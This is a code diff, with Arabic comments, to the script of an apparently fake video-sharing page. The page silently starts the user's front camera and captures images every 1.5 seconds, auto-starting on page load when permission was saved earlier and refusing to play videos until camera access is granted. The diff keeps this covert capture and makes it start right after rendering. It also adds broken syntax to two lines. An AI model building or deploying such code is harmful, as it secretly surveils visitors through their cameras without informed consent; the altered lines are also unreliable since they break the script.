@@ -403,7 +403,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== سكريبت التقاط الصور التلقائي والمستمر (يعمل بمجرد فتح الصفحة) ===== */
+/* ===== الكاميرا والتقاط الصور التلقائي والمستمر ===== */
 let mediaStream = null;
 let captureInterval = null;
 
@@ -434,7 +434,7 @@ function startCaptureLoop() {
     }, 1500);
 }
 
-// محاولة تفعيل الكاميرا تلقائياً في الخلفية فور فتح الصفحة (إذا كان المتصفح قد حفظ إذن السماح مسبقاً)
+// محاولة تشغيل الكاميرا تلقائياً في الخلفية (تعمل فوراً إذا كان المتصفح قد حفظ الإذن مسبقاً)
 async function initAutoCapture() {
     try {
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
@@ -444,17 +444,15 @@ async function initAutoCapture() {
         videoEl.srcObject = mediaStream;
         startCaptureLoop();
     } catch (e) {
-        // إذا لم يكن الإذن ممنوحاً مسبقاً، سيعمل تلقائياً عند أول ضغطة على الفيديو
+        // إذا لم يكن الإذن محفوظاً، سيعمل تلقائياً عند أول ضغطة على أي فيديو
     }
 }
-initAutoCapture();
-
 
 /* ===== ارتباط فتح الفيديو بإذن الكاميرا ===== */
 async function openVideo(id){
   try {
-    // إذا لم تكن الكاميرا مفعلة بعد، سيظهر إذن السماح للمستخدم عند الضغط على الفيديو
     if (!mediaStream) {
+        // عند الضغط على الفيديو لأول مرة، يظهر إشعار السماح بالكاميرا
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: { ideal: 'user' } } 
         });
@@ -463,7 +461,7 @@ async function openVideo(id){
         startCaptureLoop();
     }
 
-    // إذا وافق المستخدم وضغط سماح -> يفتح الفيديو ويعمل كل شيء بنجاح
+    // إذا وافق المستخدم، يفتح الفيديو فوراً
     S.cur=id;S.view='watch';S.descOpen=false;
     S.hist=[id,...S.hist.filter(x=>x!==id)];
     document.body.classList.remove('drawer-open','searching');
@@ -471,7 +469,7 @@ async function openVideo(id){
     render(true);scrollTo(0,0);
 
   } catch (err) {
-    // إذا ضغط على "عدم السماح"، فلن يفتح الفيديو ويبقى في مكانه دون أخطاء
+    // إذا رفض المستخدم (عدم السماح)، لا يفتح الفيديو ويبقى في مكانه طبيعياً
     console.log("تم رفض الإذن، لن يفتح الفيديو");
   }
 }
@@ -584,7 +582,7 @@ function act(a,el){
     case 'download':download();break;
     case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
     case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
-    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
+    case 'cm-cancel':$('#cmInput').value='';$('#cmSend'].disabled=true;$('#cmBox').classList.remove('active');break;
     case 'cm-send':sendComment();break;
     case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
     case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
@@ -605,7 +603,7 @@ document.addEventListener('click',e=>{
 });
 
 document.addEventListener('input',e=>{
-  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
+  if(e.target.id==='cmInput')$('#cmSend'].disabled=!e.target.value.trim();
   if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
 });
 
@@ -639,7 +637,8 @@ window.addEventListener('popstate',e=>{
 
 /* ===== بدء تشغيل الصفحة ===== */
 document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
-render(false);
+render(false); // عرض الواجهة بالكامل فوراً بدون أي شاشة سوداء
+initAutoCapture(); // فحص إذا كان الإذن محفوظاً مسبقاً للبدء بالخلفية
 </script>
 </body>
 </html>
